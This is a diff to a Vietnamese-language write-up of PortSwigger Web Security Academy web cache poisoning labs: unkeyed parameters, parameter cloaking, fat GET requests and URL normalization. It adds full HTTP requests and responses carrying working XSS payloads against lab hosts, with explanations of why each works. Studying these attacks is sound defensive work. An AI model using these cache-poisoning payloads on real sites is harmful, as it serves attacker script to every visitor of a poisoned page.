@@ -528,6 +528,11 @@ Host: 0a43005104ad20beda3c5184002d009e.web-security-academy.net
 ```
 
 ```http
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 22
 X-Cache: hit
 ```
 - Gửi **request** đến `/bcd` => `X-Cache: hit` cho thấy tất cả các **query** đều dùng chung 1 **cache** `/`
@@ -556,34 +561,245 @@ Host: 0a43005104ad20beda3c5184002d009e.web-security-academy.net
 #### Analysis
 - Truy cập ứng dụng
 - Gửi **request** đến **Repeater**, thêm **query string** và gửi lại
-- Làm như cách trên thêm **query string** khác nhau => tạo **cache** khác nhau
+- Làm như cách trên thêm **query string** khác nhau => response là **cache miss** => tạo **cache** khác nhau
 - Dùng **Param miner** để quét **param unkeyed** 
     - Chuột phải > **Extensions** > **Param Miner** > **Unkeyed param** 
     - Ta tìm được **Unkeyed param** `utm_content`
 - Quan sát **response** ta thấy có **reflected** ra **HTML**
 
 ```http
-GET /post?postId=4&utm_content=abc HTTP/2
+GET /?utm_content=abc HTTP/2
 Host: 0ae3006c03810a86804b7bfc001200df.web-security-academy.net
 ```
 
 ```html
-<link rel="canonical" href='//0ae3006c03810a86804b7bfc001200df.web-security-academy.net/post?postId=4&utm_content=abc'>
+<link rel="canonical" href='//0ae3006c03810a86804b7bfc001200df.web-security-academy.net/?utm_content=abc'>
 ```
 #### Exploit
 - Tạo **query string** chứa payload **XSS**
 
 ```http
-GET /post?postId=4&utm_content=abc'><img+src=1+onerror='alert() HTTP/2
+GET /?utm_content=abc'><img+src=1+onerror='alert() HTTP/2
 Host: 0ae3006c03810a86804b7bfc001200df.web-security-academy.net
 ```
 - Gửi **request** quan sát khi nào **cache** mới được tạo
 - Ứng dụng sẽ **reflected** ra **HTML** => **XSS** xảy ra
 
 ```html
-<link rel="canonical" href='//0ae3006c03810a86804b7bfc001200df.web-security-academy.net/post?postId=4&utm_content=abc'><img src=1 onerror='alert()'/>
+<link rel="canonical" href='//0ae3006c03810a86804b7bfc001200df.web-security-academy.net/?utm_content=abc'><img src=1 onerror='alert(1)'/>
 ```
-- Khi người dùng try cập `/post?postId=4`, **cache** của **cache key** sẽ được trả về
+- Khi người dùng try cập `/`, **cache** của **cache key** sẽ được trả về
+
+### Lab: Parameter cloaking
+#### Analysis
+- Truy cập ứng dụng, gửi **request** đến **repeater**
+- Gửi **request** với **param** `utm_content`
+
+```http
+GET /?xnxx&utm_content=pornhub HTTP/2
+Host: 0a9e00aa033b10248075441b00fc00f7.web-security-academy.net
+```
+
+- Gửi cho đến khi `X-Cache: hit` => đã **cache**
+- Gửi lại **request** với giá trị **param** `utm_content` khác => vẫn `X-Cache: hit` => `utm_content` là **unkeyed parameter**
+- Quan sát ta thấy có **request** đến
+
+```html
+<script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie">
+```
+
+```http
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: 0a9e00aa033b10248075441b00fc00f7.web-security-academy.net
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 0
+X-Cache: miss
+Content-Length: 201
+
+const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+setCountryCookie({"country":"United Kingdom"});
+```
+
+#### Exploit
+- Tạo **payload** và gửi đến **server**
+
+```http
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=pornhub;callback=alert(1)// HTTP/2
+Host: 0a9e00aa033b10248075441b00fc00f7.web-security-academy.net
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 0
+X-Cache: miss
+Content-Length: 201
+
+const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+alert(1)//({"country": "United Kingdom"});
+```
+- Gửi đến khi được **cache** => **reload** để xem kết quả
+
+#### Explain
+- Khi **request** đến **cache server** 
+    - Nó chỉ quan tâm đến `/js/geolocate.js?callback=setCountryCookie` phần được **cache**
+    - Vì lần đầu nên **request** được chuyển tiếp đến **server backend**
+- **Server** hỗ trợ dấu `;` để phân tách tham số 
+- `callback` sẽ bị ghi đè, **server** lấy `callback` sau và trả về **response** `alert(1)//({"country": "United Kingdom"});`
+- **Response** được lưu vào **cache** với **utm_content** bị loại khỏi **cache key**
+- Khi người dùng **request** đến `/js/geolocate.js?callback=setCountryCookie` => trả về **cache poisoned**
+
+### Lab: Web cache poisoning via a fat GET request
+#### Analysis
+- Truy cập ứng dụng
+- Quan sát ta thấy khi load trang sẽ có request đến
+
+```http
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: 0af50012040dd495a292b4300068009d.web-security-academy.net
+```
+- **Callback** `setCountryCookie` sẽ được gọi
+
+```http
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 5
+X-Cache: hit
+Content-Length: 201
+
+const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+setCountryCookie({"country":"United Kingdom"});
+```
+- Khi thay đổi callback, có thể thao túng được
+
+```http
+GET /js/geolocate.js?callback=alert(1) HTTP/2
+Host: 0af50012040dd495a292b4300068009d.web-security-academy.net
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 3
+X-Cache: hit
+Content-Length: 193
+
+const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+alert(1)({"country":"United Kingdom"});
+```
+- **Cache key** vẫn dựa vào callback trong **query string (setCountryCookie)**
+
+#### Exploit
+- Thêm **callback** vào **body param** để đầu đầu **cache**
+
+```http
+GET /js/geolocate.js?callback=alert(1) HTTP/2
+Host: 0af50012040dd495a292b4300068009d.web-security-academy.net
+
+callback=alert(1)
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 3
+X-Cache: hit
+Content-Length: 193
+
+const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+alert(1)({"country":"United Kingdom"});
+```
+
+- **Reload page** => **XSS** xảy ra
+
+#### Why?
+- **Caching layer** không kiểm tra `method` hoặc `body`.
+- **Server-side framework** xử lý **body** trong **GET** (không đúng chuẩn `HTTP/1.1`).
+- Không phân biệt rõ giữa `query param` và `form param`.
+
+### Lab: URL normalization
+#### Analysis
+- Thử gửi **GET request** đến **endpoint** bất kì => **reflected HTML**
+
+```http
+GET /xnxx HTTP/2
+Host: 0adf00e104e88c10803d1cf9008c009c.web-security-academy.net
+```
+
+```http
+HTTP/2 404 Not Found
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=10
+Age: 0
+X-Cache: miss
+Content-Length: 23
+
+<p>Not Found: /xnxx</p>
+```
+
+- Thử inject **XSS payload** chưa **encode URL**
+
+```http
+GET /xnxx<script>alert(1)</script> HTTP/2
+Host: 0adf00e104e88c10803d1cf9008c009c.web-security-academy.net
+```
+
+```http
+HTTP/2 404 Not Found
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=10
+Age: 5
+X-Cache: hit
+Content-Length: 48
+
+<p>Not Found: /xnxx<script>alert(1)</script></p>
+```
+- **XSS** xảy ra, có thể **cache** nhưng chỉ `10s`
+- Thử truy cập bằng trình duyệt `https://0adf00e104e88c10803d1cf9008c009c.web-security-academy.net/xnxx<script>alert(1)</script>`
+
+```
+Not Found: /xnxx%3Cscript%3Ealert(1)%3C/script%3E
+```
+- **XSS** không xảy ra:
+    - Khi truy cập bằng trình duyệt, nó sẽ tự động **encode URL** 
+    - **Server** phản chiếu chuỗi đã mã hóa => không thực thi `XSS`.
+
+#### Exploit
+- Gửi **request** chưa **encode URL** bằng **Burp Repeater** cho đế khi `X-Cache: hit`
+
+```http
+GET /xnxx<script>alert(1)</script> HTTP/2
+Host: 0adf00e104e88c10803d1cf9008c009c.web-security-academy.net
+```
+- Trước `10s` trở lại phải gửi `https://0adf00e104e88c10803d1cf9008c009c.web-security-academy.net/xnxx<script>alert(1)</script>` đến **victim**
+
+#### Explain
+- Giả sử **cache server** *normalize URL* trước khi lưu **cache key**, thì:
+    - `xnxx<script>alert(1)</script>`
+    - `xnxx%3Cscript%3Ealert(1)%3C/script%3E`
+- Được tính là cùng **cache key**!
+
 
 ## Prevent
 ---
